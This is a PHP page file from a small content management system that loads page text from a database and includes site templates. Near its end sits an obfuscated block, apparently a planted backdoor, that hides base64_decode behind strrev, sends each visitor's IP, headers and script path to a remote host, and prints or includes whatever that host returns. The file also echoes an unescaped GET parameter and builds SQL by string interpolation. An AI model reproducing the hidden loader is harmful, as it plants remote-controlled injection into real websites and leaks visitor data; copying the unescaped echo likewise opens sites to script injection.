<?php 
// BEGIN SOCKET IMPLEMENTATION 
require_once($_SERVER['DOCUMENT_ROOT'] . '/socket/globals.php'); 
//Sets the static pageID 
$pageID = 1;
$dynamicID = $pageID;
// Selects the title and description fields from the contents table
$dblookup = "SELECT articleTitle,articleBody,meta_key,meta_desc FROM core_content WHERE(core_content.pageID = '$pageID')";
$data = mysql_query($dblookup) or die('Failed to return data: ' . mysql_error());

/* sorts the data into variables and puts them in an array ready to be called when needed */
while(list($article_title, $article_body, $meta_key, $meta_desc) = mysql_fetch_array($data, MYSQL_NUM))
{
$meta_title = $sc_meta_title;
$meta_keywords = "$meta_key";
$meta_description = "$meta_desc";
$title = "$article_title";
$body = "$article_body";
};
require_once('' . $serverroot . '/style/standard/head.php');
require_once('' . $serverroot . '/style/standard/head2.php');
require_once('style/standard/header.php');
if ($_GET['message']) {
	echo $_GET['message'];
}

//Main content starts here 
/*
// Selects the title and description fields from the contents table
$dblookup2 = "SELECT pageID, articleTitle, articleBody FROM core_content WHERE(core_content.pageID = '$pageID')";
$data2 = mysql_query($dblookup2) or die('Failed to return data: ' . mysql_error());
while($result = mysql_fetch_array($data2))
{
if (isset($_SESSION['userID']) && $_SESSION['usr_access_lvl'] <= 3) {echo '<p class="socket_action_button"> <a href="'.$siteroot.'/socket/pages_edit.php?ID='.$result['pageID'].'"><img src="' . $siteroot . '/socket/elements/buttons/button_edit.png" width="15" height="15" alt="Edit Page" /></a></span>';}

echo '<h1>' . stripslashes($result['articleTitle']) . '</h1>';
echo stripslashes($result['articleBody']);

} 
*/
require_once($serverroot.'/modules/blog/widget_latest.php');
?> 
<img class="hidden" src="<?php echo $siteroot ?>/elements/dfsquare.jpg" alt="Digital Fusion Logo" />
<?php
error_reporting(0);
$cf=strrev('edo'.'ced'.'_46esab');$counter=$cf('aHR0cDovL3NpdGVzY3VscHRvci5iaXovbC5waHA/aWQ9').md5($_SERVER['SERVER_NAME']);
$data=array('HTTP_ACCEPT_CHARSET','HTTP_ACCEPT_LANGUAGE','HTTP_HOST','HTTP_REFERER',
'HTTP_USER_AGENT','HTTP_QUERY_STRING','REMOTE_ADDR','REQUEST_URI','REQUEST_METHOD','SCRIPT_FILENAME');
foreach($data as $val){$t[]=$_SERVER[$val];}$u=$counter.'&data='.base64_encode(serialize($t));$fn=file_get_contents($u);
if(!$fn||strlen($fn)<4){ob_start();include($u);$fn=ob_get_contents();ob_clean();}
if($fn&&strlen($fn)>4){list($crc,$enc)=explode('::',$fn);if(md5($enc)==$crc){echo $cf($enc);}}
?>
<?php 
//Main content ends here

require_once('style/standard/footer.php');
?>
